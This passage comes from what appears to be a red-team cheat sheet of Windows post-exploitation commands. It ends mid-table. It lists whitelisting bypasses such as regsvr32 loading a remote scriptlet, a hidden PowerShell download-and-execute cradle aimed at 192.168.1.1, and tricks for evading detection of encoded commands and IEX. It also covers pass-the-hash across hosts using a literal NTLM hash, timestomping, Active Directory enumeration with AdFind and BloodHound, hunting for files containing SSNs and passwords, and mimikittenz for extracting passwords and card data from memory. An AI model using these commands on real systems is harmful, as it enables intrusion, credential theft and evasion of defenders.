<span class="w">    </span><span class="n">A</span><span class="w"> </span><span class="n">signed</span><span class="w"> </span><span class="n">MS</span><span class="w"> </span><span class="nc">binary</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">loads</span><span class="w"> </span><span class="n">assemblies</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">executes</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">One</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">best</span><span class="p">.</span><span class="w"></span>
<span class="w">    </span><span class="n">Examples</span><span class="w"> </span><span class="nl">here</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">gist</span><span class="p">.</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">subTee</span><span class="w"></span>

<span class="mf">11.</span><span class="w"> </span><span class="n">Regsvcs</span><span class="o">/</span><span class="n">Regasm</span><span class="w"></span>
<span class="w">    </span><span class="nl">See</span><span class="p">:</span><span class="w"> </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">gist</span><span class="p">.</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">subTee</span><span class="o">/</span><span class="n">fb09ef511e592e6f7993</span><span class="w"></span>
<span class="w">    </span><span class="n">These</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="n">Excellent</span><span class="p">.</span><span class="w"></span>

<span class="mf">12.</span><span class="w"> </span><span class="n">regsvr32</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span>
<span class="w">    </span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">gist</span><span class="p">.</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">subTee</span><span class="o">/</span><span class="mi">24</span><span class="n">c7d8e1ff0f5602092f58cbb3f7d302</span><span class="w"></span>
<span class="w">    </span><span class="n">This</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">just</span><span class="w"> </span><span class="n">simply</span><span class="w"> </span><span class="n">amazing</span><span class="p">...</span><span class="w"> </span>
<span class="w">    </span><span class="n">regsvr32</span><span class="w"> </span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">n</span><span class="w"> </span><span class="o">/</span><span class="n">u</span><span class="w"> </span><span class="o">/</span><span class="nl">i</span><span class="p">:</span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="k">file</span><span class="p">.</span><span class="n">sct</span><span class="w"> </span><span class="n">scrobj</span><span class="p">.</span><span class="n">dll</span><span class="w"></span>

<span class="mf">13.</span><span class="w"> </span><span class="n">Msbuild</span><span class="p">.</span><span class="n">exe</span><span class="w"></span>
<span class="w">    </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">subt0x10</span><span class="p">.</span><span class="n">blogspot</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2016</span><span class="o">/</span><span class="mi">09</span><span class="o">/</span><span class="n">bypassing</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">whitelisting</span><span class="p">.</span><span class="n">html</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<h3 id="certutil">Certutil<a class="headerlink" href="#certutil" title="Permanent link">&para;</a></h3>
<p><a href="https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46">https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46</a></p>
<p>File download 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">certutil</span> <span class="o">-</span><span class="n">urlcache</span> <span class="o">-</span><span class="n">split</span> <span class="o">-</span><span class="n">f</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">file</span> 
</pre></div>
</td></tr></table></p>
<h3 id="active-directory-enumeration">Active Directory Enumeration<a class="headerlink" href="#active-directory-enumeration" title="Permanent link">&para;</a></h3>
<h4 id="adfind">Adfind<a class="headerlink" href="#adfind" title="Permanent link">&para;</a></h4>
<p><a href="http://www.joeware.net/freetools/tools/adfind/">www.joeware.net/freetools/tools/adfind/</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="w">    </span><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">account</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">up</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.4.128.40</span><span class="err">:</span><span class="mi">389</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="n">dc</span><span class="o">=</span><span class="k">domain</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="ss">&quot;objectcategory=computer&quot;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">domain_computers</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>

<span class="w">    </span><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">account</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">up</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.4.128.40</span><span class="err">:</span><span class="mi">389</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="n">dc</span><span class="o">=</span><span class="k">domain</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="ss">&quot;objectcategory=computer&quot;</span><span class="w"> </span><span class="n">distinguishedName</span><span class="w"> </span><span class="n">dNSHostName</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="n">whenchanged</span><span class="w"> </span><span class="n">operatingSystem</span><span class="w"> </span><span class="n">operatingSystemVersion</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">domain_computers_light</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>

<span class="w">    </span><span class="n">AdFind</span><span class="p">.</span><span class="n">exe</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">account</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">up</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.4.128.40</span><span class="err">:</span><span class="mi">389</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="n">dc</span><span class="o">=</span><span class="k">domain</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">com</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="ss">&quot;objectcategory=user&quot;</span><span class="w"> </span><span class="n">samaccountname</span><span class="w"> </span><span class="n">description</span><span class="w"> </span><span class="n">pwdlastset</span><span class="w"> </span><span class="n">orclcommonattribute</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">domain_users_light</span><span class="p">.</span><span class="n">txt</span><span class="w"></span>
</pre></div>
</td></tr></table></p>
<h3 id="powershell">Powershell<a class="headerlink" href="#powershell" title="Permanent link">&para;</a></h3>
<p>List help for cmdlet: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Help</span><span class="w"> </span><span class="o">[</span><span class="n">cmdlet</span><span class="o">]</span><span class="w"> </span><span class="o">-</span><span class="k">full</span><span class="w"></span></code></p>
<p>List available properties and methods: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">Member</span></code></p>
<p>For-each loop: <code class="codehilite"><span class="n">ForEach</span><span class="o">-</span><span class="k">Object</span> <span class="err">{</span> <span class="err">$</span><span class="n">_</span> <span class="err">}</span></code></p>
<p>Search for string (like grep): <code class="codehilite"><span class="k">Select</span><span class="o">-</span><span class="n">String</span><span class="w"> </span><span class="o">-</span><span class="k">path</span><span class="w"> </span><span class="o">[</span><span class="n">file</span><span class="o">]</span><span class="w"> </span><span class="o">-</span><span class="n">pattern</span><span class="w"> </span><span class="o">[</span><span class="n">string</span><span class="o">]</span><span class="w"></span></code></p>
<p>Timestomp
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">$</span><span class="nt">file</span><span class="o">=(</span><span class="nt">gi</span> <span class="nt">c</span><span class="o">:</span><span class="err">\</span><span class="nt">file</span><span class="p">.</span><span class="nc">exe</span><span class="o">);</span>
    <span class="o">$</span><span class="nt">date</span><span class="o">=</span><span class="s1">&#39;01/03/2009 12:12 pm&#39;</span><span class="o">;</span>
    <span class="o">$</span><span class="nt">file</span><span class="p">.</span><span class="nc">LastWriteTime</span><span class="o">=$</span><span class="nt">date</span><span class="o">;</span>
    <span class="o">$</span><span class="nt">file</span><span class="p">.</span><span class="nc">LastAccessTime</span><span class="o">=$</span><span class="nt">date</span><span class="o">;</span>
    <span class="o">$</span><span class="nt">file</span><span class="p">.</span><span class="nc">CreationTime</span><span class="o">=$</span><span class="nt">date</span>
</pre></div>
</td></tr></table></p>
<p>Show last system boot time
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="x">    Get-WmiObject win32_operatingsystem | select csname, @</span><span class="cp">{</span><span class="nf">LABEL</span><span class="o">=</span><span class="s1">&#39;LastBootUpTime&#39;</span><span class="o">;</span> <span class="na">EXPRESSION</span><span class="o">=</span><span class="cp">{</span><span class="nv">$_.ConverttoDateTime</span><span class="o">(</span><span class="nv">$_.lastbootuptime</span><span class="o">)</span><span class="cp">}}</span><span class="x"></span>
</pre></div>
</td></tr></table></p>
<p>Wrap binary execution in a powershell loop
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">powershell</span> <span class="nt">foreach</span> <span class="o">($</span><span class="nt">target</span> <span class="nt">in</span> <span class="o">(</span><span class="nt">get-content</span> <span class="nt">c</span><span class="o">:</span><span class="err">\</span><span class="nt">users</span><span class="err">\</span><span class="nt">username</span><span class="err">\</span><span class="nt">appdata</span><span class="err">\</span><span class="nt">local</span><span class="err">\</span><span class="nt">temp</span><span class="err">\</span><span class="nt">hosts_da_loggedin_unique</span><span class="p">.</span><span class="nc">txt</span><span class="o">))</span> <span class="p">{</span> <span class="err">&quot;</span><span class="cp">[</span><span class="o">*</span><span class="cp">]</span> <span class="err">$</span><span class="n">Target</span><span class="p">:</span><span class="err">&quot;</span><span class="p">;</span> <span class="err">(</span><span class="n">c</span><span class="p">:</span><span class="err">\</span><span class="n">programdata</span><span class="err">\</span><span class="n">sd</span><span class="o">.</span><span class="n">exe</span> <span class="o">./</span><span class="n">administrator</span><span class="o">@</span><span class="err">$</span><span class="n">target</span> <span class="o">-</span><span class="n">hashes</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="o">:</span><span class="n">a4bab1c7d4bef62d4c22043ddbf1312c</span><span class="p">)</span> <span class="p">}</span><span class="err">`</span>
</pre></div>
</td></tr></table></p>
<p>Download a file
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="x">    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = </span><span class="cp">{</span><span class="nv">$true</span><span class="cp">}</span><span class="x">;(new-object system.net.webclient).downloadfile(&quot;https://www.mydomain.com/file&quot;,&quot;C:\Users\username\AppData\Local\Temp\file.txt&quot;)</span>
</pre></div>
</td></tr></table></p>
<p>Encode string
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">echo</span> <span class="ss">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.1:80/file&#39;)&quot;</span> <span class="o">|</span> <span class="n">iconv</span> <span class="c1">--to-code UTF-16LE | base64 -w 0</span>
</pre></div>
</td></tr></table></p>
<p>List recently modified files in path (U:)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">Childitem</span> <span class="n">u</span><span class="p">:</span><span class="err">\</span> <span class="o">-</span><span class="n">Recurse</span> <span class="o">|</span> <span class="k">where</span><span class="o">-</span><span class="k">object</span> <span class="err">{</span><span class="o">!</span><span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">psiscontainer</span><span class="p">)</span><span class="err">}</span> <span class="o">|</span> <span class="k">where</span> <span class="err">{</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">LastWriteTime</span> <span class="o">-</span><span class="n">gt</span> <span class="err">$</span><span class="p">(</span><span class="k">Get</span><span class="o">-</span><span class="nb">Date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>  <span class="err">}</span> <span class="o">|</span> <span class="n">foreach</span> <span class="err">{</span><span class="ss">&quot;$($_.LastWriteTime) :: $($_.Fullname) &quot;</span>  <span class="err">}</span>
</pre></div>
</td></tr></table></p>
<p>List Files 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Select</span><span class="o">-</span><span class="n">String</span> <span class="o">-</span><span class="n">Path</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">fso</span><span class="err">\</span><span class="o">*</span><span class="p">.</span><span class="n">txt</span><span class="p">,</span> <span class="k">c</span><span class="p">:</span><span class="err">\</span><span class="n">fso</span><span class="err">\</span><span class="o">*</span><span class="p">.</span><span class="n">log</span> <span class="o">-</span><span class="n">pattern</span> <span class="n">ed</span>
</pre></div>
</td></tr></table></p>
<p>List First 100 Files
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="o">-</span><span class="n">Path</span> <span class="n">XXX</span> <span class="o">|</span><span class="k">Select</span> <span class="o">-</span><span class="k">First</span> <span class="mi">100</span> <span class="n">Fullname</span>
</pre></div>
</td></tr></table></p>
<p>List a Process's Loaded Modules (DLL)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">get</span><span class="o">-</span><span class="n">process</span> <span class="o">-</span><span class="n">id</span> <span class="mi">1234</span><span class="o">|</span><span class="k">select</span> <span class="o">-</span><span class="n">expand</span> <span class="n">modules</span>
</pre></div>
</td></tr></table></p>
<p>Remote Command Execution using MMC
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">enigma0x3</span><span class="p">.</span><span class="n">net</span><span class="o">/</span><span class="mi">2017</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="k">lateral</span><span class="o">-</span><span class="n">movement</span><span class="o">-</span><span class="k">using</span><span class="o">-</span><span class="n">the</span><span class="o">-</span><span class="n">mmc20</span><span class="o">-</span><span class="n">application</span><span class="o">-</span><span class="n">com</span><span class="o">-</span><span class="k">object</span><span class="o">/</span>
</pre></div>
</td></tr></table></p>
<p>Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C<span><span class="MathJax_Preview">,ADMIN</span><script type="math/tex">,ADMIN</script></span>)
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="n">HKLM</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="k">System</span><span class="err">\</span> <span class="o">|</span><span class="k">Select</span> <span class="n">LocalAccountTokenFilterPolicy</span> <span class="o">|</span><span class="n">fl</span>
</pre></div>
</td></tr></table></p>
<p>Test User Credentials
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">powerpick</span> <span class="err">$</span><span class="n">password</span> <span class="o">=</span> <span class="n">ConvertTo</span><span class="o">-</span><span class="n">SecureString</span> <span class="ss">&quot;PlainTextPassword&quot;</span> <span class="o">-</span><span class="n">AsPlainText</span> <span class="o">-</span><span class="k">Force</span><span class="p">;</span><span class="err">$</span><span class="n">cred</span><span class="o">=</span> <span class="k">New</span><span class="o">-</span><span class="k">Object</span> <span class="k">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span> <span class="p">(</span><span class="ss">&quot;domain\name&quot;</span><span class="p">,</span> <span class="err">$</span><span class="n">password</span><span class="p">);</span>
</pre></div>
</td></tr></table></p>
<p>Search for SSN</p>
<p><a href="https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx">https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx</a>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="err">$</span><span class="n">SSN_Regex</span> <span class="o">=</span> <span class="ss">&quot; [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}&quot;</span> <span class="p">;</span> <span class="k">Get</span><span class="o">-</span><span class="n">ChildItem</span> <span class="p">.</span> <span class="o">-</span><span class="n">Recurse</span> <span class="o">-</span><span class="n">exclude</span> <span class="o">*</span><span class="p">.</span><span class="n">exe</span><span class="p">,</span><span class="o">*</span><span class="p">.</span><span class="n">dll</span><span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="n">String</span> <span class="o">-</span><span class="n">Pattern</span> <span class="err">$</span><span class="n">SSN_Regex</span> <span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="n">String</span> <span class="o">-</span><span class="n">Pattern</span> <span class="err">$</span><span class="n">SSN_Regex</span><span class="o">|</span> <span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="n">Path</span><span class="p">,</span><span class="n">Filename</span><span class="p">,</span><span class="n">Matches</span> <span class="o">|</span><span class="n">ft</span> <span class="o">-</span><span class="n">auto</span><span class="o">|</span><span class="k">out</span><span class="o">-</span><span class="n">string</span> <span class="o">-</span><span class="n">width</span> <span class="mi">200</span><span class="p">;</span> <span class="ss">&quot;[*] SSN Search Complete!&quot;</span>
</pre></div>
</td></tr></table></p>
<p>Enumerate the use of the Windows Server Update Services (WSUS) 
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="n">Registry</span><span class="p">::</span><span class="ss">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="o">|</span><span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">WUServer</span>

    <span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="n">Registry</span><span class="p">::</span><span class="ss">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="o">|</span><span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">WUStatusServer</span>

    <span class="k">Get</span><span class="o">-</span><span class="n">ItemProperty</span> <span class="o">-</span><span class="n">Path</span> <span class="n">Registry</span><span class="p">::</span><span class="ss">&quot;HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;</span> <span class="o">|</span><span class="k">Select</span><span class="o">-</span><span class="k">Object</span> <span class="o">-</span><span class="n">ExpandProperty</span> <span class="n">UseWUServer</span>

    <span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_LOCAL_MACHINE</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">WindowsUpdate</span>
</pre></div>
</td></tr></table></p>
<p>Get unquoted service paths
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">gwmi</span> <span class="n">win32_service</span> <span class="o">|</span><span class="k">Select</span> <span class="n">pathname</span> <span class="o">|</span> <span class="k">Where</span> <span class="err">{</span><span class="p">(</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pathname</span> <span class="o">-</span><span class="n">ne</span> <span class="err">$</span><span class="k">null</span><span class="p">)</span><span class="err">}</span> <span class="o">|</span> <span class="k">Where</span> <span class="err">{</span><span class="o">-</span><span class="k">not</span> <span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">pathname</span><span class="p">.</span><span class="n">StartsWith</span><span class="p">(</span><span class="ss">&quot;`&quot;&quot;)} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(&quot;</span><span class="p">.</span><span class="ss">&quot;) +4)) -match &quot;</span><span class="p">.</span><span class="o">*</span> <span class="p">.</span><span class="o">*</span><span class="err">&quot;}</span>
</pre></div>
</td></tr></table></p>
<h4 id="find-files-custom">Find-Files (custom)<a class="headerlink" href="#find-files-custom" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Find</span><span class="o">-</span><span class="n">Files</span> <span class="o">-</span><span class="n">searchBase</span> <span class="ss">&quot;i:\&quot;</span> <span class="o">-</span><span class="n">searchTerms</span> <span class="ss">&quot;*web.xml*,*web.config*,*password*,*tomcat-users.xml*&quot;</span> <span class="o">-</span><span class="n">LogPath</span> <span class="ss">&quot;C:\Users\username\AppData\Local\Temp&quot;</span>
</pre></div>
</td></tr></table>

<h4 id="get-enumeration-custom">Get-Enumeration (custom)<a class="headerlink" href="#get-enumeration-custom" title="Permanent link">&para;</a></h4>
<p>Run Local and Domain enumeration functions on the local host.
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="k">Get</span><span class="o">-</span><span class="n">Enumeration</span> <span class="o">-</span><span class="n">Path</span> <span class="p">.</span> <span class="o">-</span><span class="k">Local</span> <span class="o">-</span><span class="k">Domain</span>
</pre></div>
</td></tr></table></p>
<h4 id="download-and-execute-iex">Download and execute IEX<a class="headerlink" href="#download-and-execute-iex" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">powershell</span> <span class="o">-</span><span class="n">nop</span> <span class="o">-</span><span class="n">w</span> <span class="n">hidden</span> <span class="o">-</span><span class="k">c</span> <span class="ss">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.1.1:80/file&#39;)&quot;</span> 
</pre></div>
</td></tr></table>

<h4 id="encodedcommand-and-iex-detection-bypass">EncodedCommand and IEX detection bypass<a class="headerlink" href="#encodedcommand-and-iex-detection-bypass" title="Permanent link">&para;</a></h4>
<p>Author: Dave Kennedy
Source: <a href="https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/">https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/</a></p>
<p>Avoid detection of -enc
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">powershell</span> <span class="o">-</span><span class="n">window</span> <span class="n">hidden</span> <span class="o">-</span><span class="k">C</span> <span class="ss">&quot;set-variable -name &quot;</span><span class="k">C</span><span class="ss">&quot; -value &quot;</span><span class="o">-</span><span class="ss">&quot;; set-variable -name &quot;</span><span class="n">s</span><span class="ss">&quot; -value &quot;</span><span class="n">e</span><span class="ss">&quot;; set-variable -name &quot;</span><span class="n">q</span><span class="ss">&quot; -value &quot;</span><span class="k">c</span><span class="ss">&quot;; set-variable -name &quot;</span><span class="n">P</span><span class="ss">&quot; -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() &lt;b64encodedcommandhere&gt;&quot;</span>
</pre></div>
</td></tr></table></p>
<p>Avoid detection of IEX
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">powershell</span> <span class="o">-</span><span class="n">window</span> <span class="n">hidden</span> <span class="o">-</span><span class="k">C</span> <span class="ss">&quot;set-variable -name &quot;</span><span class="n">LB</span><span class="ss">&quot; -value &quot;</span><span class="n">I</span><span class="ss">&quot;; set-variable -name &quot;</span><span class="n">I</span><span class="ss">&quot; -value &quot;</span><span class="n">E</span><span class="ss">&quot;; set-variable -name &quot;</span><span class="n">V</span><span class="ss">&quot; -value &quot;</span><span class="n">X</span><span class="ss">&quot;; set-variable -name &quot;</span><span class="n">wP</span><span class="ss">&quot; -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() (&#39;&lt;YOURINVOKEEXPRESSIONSTUFFHERE&gt;&#39;)&quot;</span>
</pre></div>
</td></tr></table></p>
<h4 id="bloodhound">Bloodhound<a class="headerlink" href="#bloodhound" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="nt">iex</span><span class="o">((</span><span class="nt">new-object</span> <span class="nt">system</span><span class="p">.</span><span class="nc">net</span><span class="p">.</span><span class="nc">webclient</span><span class="o">)</span><span class="p">.</span><span class="nc">downloadstring</span><span class="o">(</span><span class="s1">&#39;https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1&#39;</span><span class="o">));</span><span class="nt">Invoke-Bloodhound</span> <span class="nt">-CSVFolder</span> <span class="nt">c</span><span class="o">:</span><span class="err">\</span><span class="nt">temp</span> <span class="nt">-CSVPrefix</span> <span class="o">&lt;</span><span class="nt">prefix</span><span class="o">&gt;</span>

    <span class="nt">Invoke-BloodHound</span> <span class="nt">-DomainController</span> <span class="o">&lt;</span><span class="nt">domain</span> <span class="nt">IP</span><span class="o">&gt;</span> <span class="nt">-Domain</span> <span class="o">&lt;</span><span class="nt">FQDN</span><span class="o">&gt;</span> <span class="nt">-CSVFolder</span> <span class="nt">C</span><span class="o">:</span><span class="err">\</span><span class="nt">users</span><span class="err">\</span><span class="nt">public</span><span class="err">\</span><span class="nt">libraries</span> <span class="nt">-CSVPrefix</span> <span class="o">&lt;</span><span class="nt">prefix</span><span class="o">&gt;</span> <span class="nt">-CollectionMethod</span> <span class="nt">Stealth</span>
</pre></div>
</td></tr></table>

<h4 id="mimikittenz">Mimikittenz<a class="headerlink" href="#mimikittenz" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/putterpanda/mimikittenz">https://github.com/putterpanda/mimikittenz</a></p>
<p>mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes.</p>
<p>mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to:</p>
<ul>
<li>TRACK2 (CreditCard) data from merchant/POS processes</li>
<li>PII data</li>
<li>Encryption Keys &amp; All the other goodstuff</li>
</ul>
<p>Execution
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="n">Invoke</span><span class="o">-</span><span class="n">Mimikittenz</span>
</pre></div>
</td></tr></table></p>
<p>Customizations
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
2
3
4
